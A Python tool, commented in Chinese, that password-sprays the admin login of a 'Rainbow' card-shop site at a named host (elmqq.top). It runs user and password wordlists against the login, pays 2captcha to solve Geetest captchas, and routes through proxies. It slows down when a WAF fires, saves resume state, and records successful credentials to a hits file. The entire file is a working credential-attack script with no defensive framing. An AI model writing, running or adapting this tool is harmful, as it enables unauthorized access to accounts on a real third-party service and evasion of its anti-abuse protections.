#!/usr/bin/env python3
"""彩虹发卡后台登录喷洒（Geetest + 2captcha），带断点续跑。

用法:
  python3 login_spray_bg.py
  python3 login_spray_bg.py --users /path/users.txt --limit-pass 500
"""
from __future__ import annotations

import argparse
import json
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "cookie"))

from cookie.geetest_2captcha import get_balance  # noqa: E402
from cookie.rainbow_skey_harvest import RainbowSession  # noqa: E402
from faka_common import ensure_out, load_wordlist, log, resolve_proxy, save_hit  # noqa: E402

DEFAULT_HOST = "elmqq.top"
DEFAULT_PATH = "/shop/"
DEFAULT_USERS = ROOT / "data" / "rainbow_users.txt"
DEFAULT_PASSWORDS = ROOT / "data" / "top500_passwords.txt"
OUT_DIR = Path("/data/tools/faka/out/elmqq")
if not OUT_DIR.parent.exists():
    OUT_DIR = ROOT / "out" / "elmqq"
OUT_DIR.mkdir(parents=True, exist_ok=True)

PROGRESS_FILE = OUT_DIR / "login_spray_progress.json"
HITS_FILE = OUT_DIR / "login_hits.jsonl"
LOG_FILE = OUT_DIR / "login_spray_bg.log"


def ts() -> str:
    return time.strftime("%Y-%m-%d %H:%M:%S")


def log_line(msg: str) -> None:
    line = f"[{ts()}] {msg}"
    print(line, flush=True)
    with LOG_FILE.open("a", encoding="utf-8") as f:
        f.write(line + "\n")


def load_progress() -> dict:
    if PROGRESS_FILE.exists():
        try:
            return json.loads(PROGRESS_FILE.read_text(encoding="utf-8"))
        except Exception:
            pass
    return {"user_idx": 0, "pass_idx": 0, "hits": 0, "attempts": 0, "last_user": "", "last_pass": ""}


def save_progress(state: dict) -> None:
    PROGRESS_FILE.write_text(json.dumps(state, ensure_ascii=False, indent=2), encoding="utf-8")


def parse_args() -> argparse.Namespace:
    ap = argparse.ArgumentParser(description="彩虹 Geetest 登录喷洒")
    ap.add_argument("--host", default=DEFAULT_HOST)
    ap.add_argument("--path", default=DEFAULT_PATH)
    ap.add_argument("--users", default=str(DEFAULT_USERS))
    ap.add_argument("--passwords", default=str(DEFAULT_PASSWORDS))
    ap.add_argument("--limit-pass", type=int, default=500)
    ap.add_argument("--proxy", default="auto")
    ap.add_argument("--min-balance", type=float, default=0.5)
    ap.add_argument("--sleep", type=float, default=2.0, help="每次尝试间隔秒")
    ap.add_argument("--max-attempts", type=int, default=0, help="0=不限")
    return ap.parse_args()


def classify(msg: str, code: int | None) -> str:
    msg = str(msg or "")
    if code == 0:
        return "ok"
    if any(x in msg for x in ("密码", "不正确", "错误", "invalid", "wrong")):
        return "bad_password"
    if any(x in msg for x in ("不存在", "未注册", "no user")):
        return "no_user"
    if any(x in msg for x in ("验证", "captcha", "geetest", "请先完成")):
        return "captcha"
    if "防火墙" in msg or "WAF" in msg:
        return "waf"
    return "other"


def main() -> int:
    args = parse_args()
    ensure_out(HITS_FILE)
    ensure_out(LOG_FILE)

    try:
        bal = get_balance()
        log_line(f"2captcha balance=${bal:.2f}")
        if bal < args.min_balance:
            log_line(f"[!] 余额不足 ${bal:.2f} < ${args.min_balance}，停止")
            return 2
    except Exception as e:
        log_line(f"[!] 2captcha 不可用: {e}")
        return 2

    users = list(load_wordlist(args.users))
    passwords = list(load_wordlist(args.passwords, limit=args.limit_pass))
    proxy = resolve_proxy(args.proxy)
    state = load_progress()

    log_line(
        f"START host={args.host} path={args.path} users={len(users)} pass={len(passwords)} "
        f"resume user_idx={state['user_idx']} pass_idx={state['pass_idx']} proxy={'yes' if proxy else 'direct'}"
    )

    attempts = state.get("attempts", 0)
    hits = state.get("hits", 0)
    user_idx = state.get("user_idx", 0)

    while user_idx < len(users):
        user = users[user_idx]
        pass_start = state["pass_idx"] if user_idx == state.get("user_idx", 0) else 0
        no_user = False

        for pass_idx in range(pass_start, len(passwords)):
            if args.max_attempts and attempts >= args.max_attempts:
                save_progress({**state, "user_idx": user_idx, "pass_idx": pass_idx, "hits": hits, "attempts": attempts})
                log_line(f"达到 max-attempts={args.max_attempts}，暂停")
                return 0

            password = passwords[pass_idx]
            attempts += 1
            state.update({
                "user_idx": user_idx,
                "pass_idx": pass_idx,
                "hits": hits,
                "attempts": attempts,
                "last_user": user,
                "last_pass": password,
            })
            if attempts % 5 == 0:
                save_progress(state)

            log_line(f"TRY {user_idx+1}/{len(users)} {user} pass {pass_idx+1}/{len(passwords)} ({password[:20]})")

            try:
                sess = RainbowSession(args.host, args.path, proxy)
                result = sess.login(user, password, use_2captcha=True)
            except Exception as e:
                log_line(f"ERR {user}:{password} -> {e}")
                time.sleep(args.sleep * 2)
                continue

            code = result.get("code")
            msg = str(result.get("msg", ""))
            kind = classify(msg, code if isinstance(code, int) else None)

            if result.get("login_ok") or kind == "ok":
                hits += 1
                payload = {
                    "host": args.host,
                    "user": user,
                    "password": password,
                    "result": result,
                }
                save_hit(HITS_FILE, "login_ok", payload)
                log_line(f"[+] HIT {user}:{password} code={code} msg={msg}")
                state["hits"] = hits
                save_progress(state)
                return 0

            log_line(f"    -> kind={kind} code={code} msg={msg[:80]}")
            if kind == "no_user":
                no_user = True
                break
            if kind == "waf":
                log_line("WAF 触发，加长等待")
                time.sleep(args.sleep * 5)
            time.sleep(args.sleep)

        state["pass_idx"] = 0
        user_idx += 1
        state["user_idx"] = user_idx
        save_progress(state)
        if no_user:
            log_line(f"[-] 用户不存在，跳过: {user}")

    log_line(f"DONE attempts={attempts} hits={hits}")
    return 0 if hits else 1


if __name__ == "__main__":
    raise SystemExit(main())
